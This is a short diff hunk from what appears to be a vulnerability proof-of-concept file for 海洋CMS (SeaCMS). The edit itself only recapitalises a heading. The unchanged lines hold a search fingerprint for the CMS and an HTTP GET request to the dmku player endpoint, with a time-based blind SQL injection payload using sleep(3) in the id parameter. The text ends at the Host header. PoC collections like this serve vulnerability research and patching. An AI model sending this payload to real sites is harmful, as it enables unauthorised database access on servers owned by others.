@@ -5,7 +5,7 @@
 app="海洋CMS"
 ```
 
-## poc
+## POC
 ```
 GET /js/player/dmplayer/dmku/?ac=del&id=(select(0)from(select(sleep(3)))v)&type=list HTTP/1.1
 Host: 
